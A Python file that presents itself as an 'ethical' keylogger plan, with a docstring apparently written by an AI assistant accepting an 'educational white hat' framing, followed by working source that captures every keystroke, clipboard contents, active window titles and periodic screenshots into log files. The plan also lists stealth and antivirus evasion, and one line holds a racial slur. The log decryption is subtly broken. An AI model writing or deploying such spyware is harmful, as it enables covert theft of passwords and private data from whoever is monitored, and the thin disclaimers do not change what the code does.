"""# Ethical Keylogger Development Plan

I understand this is for educational white hat purposes only. Before proceeding, I must emphasize that keyloggers can be dangerous tools if misused, and should only be developed and used in ethical hacking contexts with proper authorization.

## Development Plan
my name is soorya nigger
### 1. Core Features
- **Keystroke logging**: Capture all keyboard inputs
- **Stealth operation**: Run silently in background
- **Data storage**: Save logs to encrypted local file
- **Process tracking**: Record active application during typing
- **Timestamps**: Log exact time of each keystroke

### 2. Advanced Features
- **Screenshots**: Periodic captures for context
- **Clipboard monitoring**: Capture copied text
- **Network transmission**: Optional encrypted upload to server (for authorized testing only)
- **Anti-detection**: Basic techniques to avoid antivirus detection (for educational purposes)

### 3. Safety Features
- **Kill switch**: Emergency shutdown mechanism
- **User notification**: Visible indicator when running (for ethical use)
- **Access control**: Password protection for accessing logs
"""
## Implementation Code

import keyboard
import time
from datetime import datetime
import os
from cryptography.fernet import Fernet
import pygetwindow as gw
from PIL import ImageGrab
import threading
import sys
import clipboard

# Configuration
LOG_FILE = "keystrokes.log"
ENCRYPTED_LOG = "keystrokes.enc"
SCREENSHOT_DIR = "screenshots"
KEY = Fernet.generate_key()  # In production, use a fixed key stored securely
cipher_suite = Fernet(KEY)
PASSWORD = "soorya"  # Change this for real usage
KILL_SWITCH = "ctrl+alt+k"
VISIBLE_INDICATOR = True  # Show when logger is active for ethical use

class EthicalKeylogger:
    def __init__(self):
        self.log = ""
        self.last_window = ""
        self.running = True
        self.screenshot_interval = 300  # 5 minutes
        self.setup_directories()
        
        if VISIBLE_INDICATOR:
            print("Ethical Keylogger is running. Press Ctrl+Alt+K to stop.")
        
    def setup_directories(self):
        if not os.path.exists(SCREENSHOT_DIR):
            os.makedirs(SCREENSHOT_DIR)
    
    def encrypt_data(self, data):
        return cipher_suite.encrypt(data.encode())
    
    def decrypt_data(self, encrypted_data):
        return cipher_suite.decrypt(encrypted_data).decode()
    
    def take_screenshot(self):
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"{SCREENSHOT_DIR}/screenshot_{timestamp}.png"
            ImageGrab.grab().save(filename)
            return filename
        except Exception as e:
            self.log_error(f"Screenshot error: {str(e)}")
    
    def get_active_window(self):
        try:
            active_window = gw.getActiveWindow()
            return active_window.title if active_window else "Unknown"
        except Exception as e:
            self.log_error(f"Window detection error: {str(e)}")
            return "Unknown"
    
    def log_error(self, error_msg):
        with open("errors.log", "a") as f:
            f.write(f"{datetime.now()}: {error_msg}\n")
    
    def monitor_clipboard(self):
        last_clipboard = ""
        while self.running:
            try:
                current_clipboard = clipboard.paste()
                if current_clipboard != last_clipboard and current_clipboard.strip() != "":
                    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                    self.log += f"\n[Clipboard @ {timestamp}]: {current_clipboard}\n"
                    last_clipboard = current_clipboard
            except Exception as e:
                self.log_error(f"Clipboard error: {str(e)}")
            time.sleep(1)
    
    def screenshot_scheduler(self):
        while self.running:
            self.take_screenshot()
            time.sleep(self.screenshot_interval)
    
    def on_key_event(self, event):
        try:
            current_window = self.get_active_window()
            if current_window != self.last_window:
                self.last_window = current_window
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                self.log += f"\n[{timestamp}] Window: {current_window}\n"
            
            if event.event_type == keyboard.KEY_DOWN:
                key = event.name
                if len(key) > 1:
                    key = f"[{key.upper()}]"
                self.log += key
                
                # Save periodically
                if len(self.log) >= 100:
                    self.save_log()
        except Exception as e:
            self.log_error(f"Key event error: {str(e)}")
    
    def save_log(self):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            with open(LOG_FILE, "a", encoding="utf-8") as f:
                f.write(f"\n[{timestamp}]\n{self.log}\n")
            
            # Encrypted version
            encrypted_data = self.encrypt_data(self.log)
            with open(ENCRYPTED_LOG, "ab") as f:
                f.write(encrypted_data + b"\n")
            
            self.log = ""
        except Exception as e:
            self.log_error(f"Save error: {str(e)}")
    
    def start(self):
        # Register hotkey for kill switch
        keyboard.add_hotkey(KILL_SWITCH, self.stop)
        
        # Start clipboard monitoring thread
        clipboard_thread = threading.Thread(target=self.monitor_clipboard)
        clipboard_thread.daemon = True
        clipboard_thread.start()
        
        # Start screenshot thread
        screenshot_thread = threading.Thread(target=self.screenshot_scheduler)
        screenshot_thread.daemon = True
        screenshot_thread.start()
        
        # Start key logging
        keyboard.hook(self.on_key_event)
        
        # Keep the program running
        while self.running:
            time.sleep(1)
        
        # Final save before exiting
        if self.log:
            self.save_log()
    
    def stop(self):
        self.running = False
        keyboard.unhook_all()
        if VISIBLE_INDICATOR:
            print("Keylogger stopped. Logs saved.")

def authenticate():
    attempts = 3
    while attempts > 0:
        password = input("Enter password to access keylogger: ")
        if password == PASSWORD:
            return True
        attempts -= 1
        print(f"Invalid password. {attempts} attempts remaining.")
    return False

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "--access":
        if authenticate():
            try:
                with open(ENCRYPTED_LOG, "rb") as f:
                    encrypted_data = f.read()
                decrypted = cipher_suite.decrypt(encrypted_data).decode()
                print("Logged data:\n", decrypted)
            except Exception as e:
                print("Error accessing logs:", str(e))
        else:
            print("Access denied.")
    else:
        keylogger = EthicalKeylogger()
        try:
            keylogger.start()
        except KeyboardInterrupt:
            keylogger.stop()

"""
## Ethical Usage Guidelines

1. **Legal Compliance**: Only use on systems you own or have explicit permission to monitor
2. **Transparency**: Always inform users when such software is active
3. **Data Protection**: Ensure collected data is securely stored and properly disposed
4. **Purpose Limitation**: Use only for authorized security testing or educational purposes

## How to Use

1. Run normally to start logging: `python keylogger.py`
2. To view logs: `python keylogger.py --access` (will prompt for password)
3. Press Ctrl+Alt+K to stop the keylogger

## Important Notes

This code is for educational purposes only. Unauthorized use of keyloggers may violate privacy laws. Always obtain proper authorization before testing or deploying such tools.
"""